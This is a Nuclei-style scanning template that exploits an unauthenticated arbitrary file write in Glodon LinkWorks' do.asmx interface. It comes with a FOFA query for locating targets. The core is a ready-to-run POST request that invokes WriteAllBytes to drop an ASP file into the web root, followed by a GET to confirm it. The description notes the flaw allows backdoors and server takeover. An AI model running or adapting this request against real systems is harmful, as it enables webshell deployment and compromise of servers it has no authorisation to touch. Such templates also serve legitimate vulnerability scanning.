id: glodon-linkworks-doasmx-write

info:
  name: 广联达LinkWorks do.asmx接口控制器配置缺陷导致任意文件写入漏洞
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
      广联达LinkWorks系统/m/mobileAction.ashxdo.asmx接口因控制器配置缺陷，允许未认证攻击者通过构造特定请求参数实现任意文件写入与读取操作。该漏洞可被利用部署恶意代码、创建持久化后门、窃取敏感数据或实现服务器控制权转移。
      文件写入路径示例：/UserFiles/NTest.asp
      上传请求体需根据目标环境定制，文件内容需转换为10进制ASCII编码格式传输
  tags: 广联达

flow: |
  http(1) && http(2)

http:
- raw:
  - |
    POST /m/mobileAction.ashx/do.asmx?controller=Microsoft.VisualBasic.FileIO.FileSystem%2c%20Microsoft.VisualBasic%2c%20Version%3d8.0.0.0%2c%20Culture%3dneutral%2c%20PublicKeyToken%3db03f5f7f11d50a3a&action=WriteAllBytes HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: gzip, deflate
    Content-Type: application/json
    Connection: close

    ["\"D:\\\\Program Files (x86)\\\\Glodon\\\\GTP\\\\data\\\\gtp-default\\\\FileStorage\\\\UserFiles\\\\NTest.asp\"","[68, 117, 100, 101, 83, 117, 105, 116, 101]","false"]
- raw:
  - |
    GET /UserFiles/NTest.asp HTTP/1.1
    Host: {{Hostname}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'IsSuccess'
  - type: word
    part: body
    words:
    - 'OK'
